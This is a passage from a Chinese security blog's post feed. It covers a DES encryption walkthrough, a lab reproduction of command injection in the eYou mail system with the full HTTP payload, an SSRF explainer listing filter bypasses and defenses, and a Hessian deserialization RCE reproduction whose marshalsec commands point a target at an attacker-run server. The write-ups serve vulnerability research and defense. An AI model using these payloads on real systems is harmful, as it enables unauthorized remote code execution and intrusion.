class="line">07,13,14,03,00,06,09,10,01,02,08,05,11,12,04,15,</span><br><span class="line">13,08,11,05,06,15,00,03,04,07,02,12,01,10,14,09,</span><br><span class="line">10,06,09,00,12,11,07,13,15,01,03,14,05,02,08,04,</span><br><span class="line">03,15,00,06,10,01,13,08,09,04,05,11,12,07,02,14,</span><br></pre></td></tr></table></figure><p>S-盒5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">02,12,04,01,07,10,11,06,08,05,03,15,13,00,14,09,</span><br><span class="line">14,11,02,12,04,07,13,01,05,00,15,10,03,09,08,06,</span><br><span class="line">04,02,01,11,10,13,07,08,15,09,12,05,06,03,00,14,</span><br><span class="line">11,08,12,07,01,14,02,13,06,15,00,09,10,04,05,03,</span><br></pre></td></tr></table></figure><p>S-盒6：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">12,01,10,15,09,02,06,08,00,13,03,04,14,07,05,11,</span><br><span class="line">10,15,04,02,07,12,09,05,06,01,13,14,00,11,03,08,</span><br><span class="line">09,14,15,05,02,08,12,03,07,00,04,10,01,13,11,06,</span><br><span class="line">04,03,02,12,09,05,15,10,11,14,01,07,06,00,08,13,</span><br></pre></td></tr></table></figure><p>S-盒7：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">04,11,02,14,15,00,08,13,03,12,09,07,05,10,06,01,</span><br><span class="line">13,00,11,07,04,09,01,10,14,03,05,12,02,15,08,06,</span><br><span class="line">01,04,11,13,12,03,07,14,10,15,06,08,00,05,09,02,</span><br><span class="line">06,11,13,08,01,04,10,07,09,05,00,15,14,02,03,12,</span><br></pre></td></tr></table></figure><p>S-盒8：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">13,02,08,04,06,15,11,01,10,09,03,14,05,00,12,07,</span><br><span class="line">01,15,13,08,10,03,07,04,12,05,06,11,00,14,09,02,</span><br><span class="line">07,11,04,01,09,12,14,02,00,06,10,13,15,03,05,08,</span><br><span class="line">02,01,14,07,04,10,08,13,15,12,09,00,03,05,06,11,</span><br></pre></td></tr></table></figure><p><font color=#FF0000>S盒的计算规则：</font></p><p>例如：若S-盒1的输入为110111，第一位与最后一位构成11，十进制值为3，则对应第3行，中间4位为1011对应的十进制值为11，则对应第11列。查找S-盒1表的值为14，则S-盒1的输出为1110。8个S盒将输入的48位数据输出为32位数据。</p><p>按照S-盒的计算过程，将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E(R0)^K1（48位）&#x3D; 100110110001010100010001011111001010010001110100，</span><br></pre></td></tr></table></figure><p>通过 S- 盒替换得到的S盒输出为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10001011110001000110001011101010（32位）。</span><br></pre></td></tr></table></figure><ul><li>P-盒置换<br>将S-盒替代的输出结果作为P-盒置换的输入。P-盒置换表如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">16,07,20,21,29,12,28,17,01,15,23,26,05,18,31,10,</span><br><span class="line">02,08,24,14,32,27,03,09,19,13,30,06,22,11,04,25,</span><br></pre></td></tr></table></figure>将S盒输出10001011110001000110001011101010（32位）经过P盒置换，P-盒置换输出01001000101111110101010110000001</li></ul><p>令扩展置换E、S-盒替代、P盒置换的过程作为函数f。</p><p>第一次迭代过程f(R0,K1)为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(R0,K1) &#x3D; 01001000101111110101010110000001</span><br></pre></td></tr></table></figure><p>计算L1（32位）= R0 = 00000000111111110000011010000011<br>计算R1（32位）= L0 ^ f(R0,K1)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  11111111101110000111011001010111</span><br><span class="line">  01001000101111110101010110000001</span><br><span class="line">&#x3D; 10110111000001110010001111010110</span><br></pre></td></tr></table></figure><p>R1（32位） = 10110111000001110010001111010110。</p><p>将L1与R1作为输入，继续执行迭代过程f。直至输出L16与R16。</p><p>经过16次迭代后输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L16（32位）&#x3D; 00110000100001001101101100101000</span><br><span class="line">R16（32位）&#x3D; 10110001011001010011000000011000</span><br></pre></td></tr></table></figure><ul><li>逆置换<br>将初始置换进行16次的迭代，即进行16层的加密变换，得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。逆置换是初始置换的逆运算。从初始置换规则中可以看到，原始数据的第1位置换到了第40位，第2位置换到了第8位。则逆置换就是将第40位置换到第1位，第8位置换到第2位。以此类推，逆置换规则表如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">40,08,48,16,56,24,64,32,</span><br><span class="line">39,07,47,15,55,23,63,31,</span><br><span class="line">38,06,46,14,54,22,62,30,</span><br><span class="line">37,05,45,13,53,21,61,29,</span><br><span class="line">36,04,44,12,52,20,60,28,</span><br><span class="line">35,03,43,11,51,19,59,27,</span><br><span class="line">34,02,42,10,50,18,58 26,</span><br><span class="line">33,01,41,09,49,17,57,25,</span><br></pre></td></tr></table></figure>逆置换过程图：</li></ul><p><img src="/images/pasted-13.png" alt="upload successful"></p><p>将L16与R16构成64位数据，经过逆置换表输出密文为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：0101100000001000001100000000101111001101110101100001100001101000</span><br></pre></td></tr></table></figure><hr><p>DES 加密算法为最为常见的分组加密算法。其主要思想在于数据位的置换与移位过程，通过16次的迭代加密与最终的逆置换得出最终的密文。DES 的解密方式只需按照加密的逆过程求解即可。由于DES 加密过程的算法是公开的，所以密钥K的保密就显得尤为重要，只有发送方与接收方采用相同的密钥进行加密解密才能获取明文数据。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>亿邮邮件系统命令执行</title>
      <link href="2021/04/16/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>2021/04/16/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="一、影响范围"><a href="#一、影响范围" class="headerlink" title="一、影响范围"></a>一、影响范围</h3><ul><li><p>V8.3-V8.13 </p><span id="more"></span><h3 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h3><ul><li><p>界面信息</p><p><img src="/images/pasted-0.png"></p></li></ul></li></ul><h3 id="三、漏洞证明"><a href="#三、漏洞证明" class="headerlink" title="三、漏洞证明"></a>三、漏洞证明</h3><ol><li><p>访问poc的url：10.10.10.130:9091/webadm/q=moni_detail.do&amp;action=gragh<br> <img src="/images/pasted-1.png"></p></li><li><p>这个返回数据包可用来批量探测是否有价值使用exp来打，如有自写扫描器可加入该poc进行无损扫描。</p></li><li><p>抓包然后发送payload</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /webadm/?q=moni_detail.do&amp;action=gragh HTTP/1.1</span><br><span class="line">Host: 10.10.10.130:9091</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: <span class="string">&quot; Not;A Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;91&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;91&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: ****</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span>=<span class="string">&#x27;|id||&#x27;</span></span><br></pre></td></tr></table></figure><p> <img src="/images/pasted-2.png"></p></li></ol><h3 id="四、修复建议"><a href="#四、修复建议" class="headerlink" title="四、修复建议"></a>四、修复建议</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls&#x2F;usr&#x2F;local&#x2F;eyou&#x2F;mail&#x2F;lib&#x2F;php&#x2F;monitor (8.10.x及以后版本)</span><br><span class="line">ls&#x2F;usr&#x2F;local&#x2F;eyou&#x2F;mail&#x2F;app&#x2F;lib&#x2F;php&#x2F;monitor (8.10.x及以前版本)</span><br><span class="line"></span><br><span class="line">*如不了解具体版本号，上述两条命令可不分版本都执行一下</span><br><span class="line">如所有的验证命令都返回&quot;No such file or directory&quot;或&quot;没有那个文件或目录&quot;则证明不存在漏洞，反之则漏洞存在。</span><br></pre></td></tr></table></figure><p><br/><br/></p><ul><li>文章参考 <a href="https://mp.weixin.qq.com/s/0YUpI9O7GqATGXqcOMRCBw">【漏洞复现】亿邮命令执行</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞利用及防护</title>
      <link href="2021/04/16/test/"/>
      <url>2021/04/16/test/</url>
      
        <content type="html"><![CDATA[<h3 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h3><ul><li>SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</li></ul><hr><h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><ul><li>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</li></ul><ul><li>主要攻击方式如下:   </li></ul><ol><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li><li>利用file协议读取本地文件等。</li></ol><hr><h3 id="三、漏洞常见功能点"><a href="#三、漏洞常见功能点" class="headerlink" title="三、漏洞常见功能点"></a>三、漏洞常见功能点</h3><ul><li>加载远程图片功能。</li><li>加载远程网页功能。</li><li>未公开的api实现及调用URL的功能。</li><li>网站提供的各种下载功能点。</li><li>在线网页转码服务。</li></ul><hr><h3 id="四、常见的绕过方式"><a href="#四、常见的绕过方式" class="headerlink" title="四、常见的绕过方式"></a>四、常见的绕过方式</h3><ol><li><p> @ 符号<br><code>例如：http://abc.com@127.0.0.1</code></p></li><li><p> 添加端口号<br><code>例如：http://127.0.0.1:8080</code></p></li><li><p>短地址<br><code>例如：https://0x9.me/xxx</code></p></li><li><p>利用302跳转<br><code> 例如：将http://zidingyu.com/index.php 设置跳转到127.0.0.1</code></p></li><li><p>将内部IP进行进制转换<br><code>例如：192.168.0.1=3232235521（十进制）</code></p></li><li><p>利用非HTTP协议<br><code>例如: file:///, gopher://, ftp:// </code></p></li><li><p>DNS Rebinding - <a href="https://xz.aliyun.com/t/8707">先知社区</a></p></li></ol><ul><li><p>例如一个漏洞点采用了以下的方式进行了防御</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">1. 获取到输入的URL，从该URL中提取host.</span><br><span class="line"></span><br><span class="line">2. 对该host进行DNS解析，获取到解析的IP.</span><br><span class="line"></span><br><span class="line">3. 检测该IP是否是合法的，比如是否是私有IP等.</span><br><span class="line"></span><br><span class="line">4. 如果IP检测为合法的，则进入curl的阶段发包</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p>从DNS解析的角度来看，这个过程一共有两次解析，第一次是对该host进行DNS解析，第二次是进入curl的阶段发包，这两次请求之间存在一个时间差，如果我们能够修改DNS地址在第一次请求的时候为合法地址，第二次请求时为恶意地址，就可以绕过这个检测了。</p></li><li><p>利用过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者配置了一台DNS服务器用于解析某域名.</span><br><span class="line"></span><br><span class="line">2. 每次请求后返回的解析结果不一样，分别是一个合法地址，一个是恶意地址.</span><br><span class="line"></span><br><span class="line">3. 当服务器在第一次请求的时候返回合法地址，第二次请求时返回的是恶意地址。就可以绕过限制进行利用.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h3><ol><li><p>对于有回显的请求，过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。  </p></li><li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p></li><li><p>将内网敏感IP做黑名单限制。避免应用被用来获取获取内网数据，攻击内网。</p></li><li><p>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p></li></ol><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hessian反序列化RCE漏洞</title>
      <link href="2021/04/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/04/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="一、组件介绍"><a href="#一、组件介绍" class="headerlink" title="一、组件介绍"></a>一、组件介绍</h3><ul><li>Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，对于数据包比较大的情况比较友好。Hessian反序列化可导致RCE,POC于2017年就公开了,但是经过测试,目前最新版本hessian-4.0.60.jar,同样存在反序列化问题</li></ul><h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><ol><li><p>需要一个提供反序列数据的服务器。</p><p> <img src="/images/pasted-3.png" alt="upload successful"></p></li><li><p>攻击端本地生成payload.里面的地址为提供反序列化数据的服务器地址。</p></li></ol>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Resin http:&#x2F;&#x2F;471.196.183.126:8180&#x2F; ExecTemplateJDK7&gt;hession</span><br></pre></td></tr></table></figure><pre><code>![upload successful](/images/pasted-4.png)</code></pre><p>   攻击端本地生成hession文件。</p><ol start="3"><li>攻击端本地向目标发送payload，使得目标服务器向提供反序列化数据的服务器进行请求。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python hessian.py -u http:&#x2F;&#x2F;192.168.182.178:8080&#x2F;HessianTest&#x2F;hessian -p hession</span><br></pre></td></tr></table></figure> <img src="/images/pasted-5.png" alt="upload successful"></li><li>目标服务器收到payload，并序列化payload，然后向提供反序列化数据的服务器进行请求。<br> 收到请求 <img src="/images/pasted-6.png" alt="upload successful"></li><li>目标服务器成功执行命令。 <img src="/images/pasted-7.png" alt="upload successful"></li></ol>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
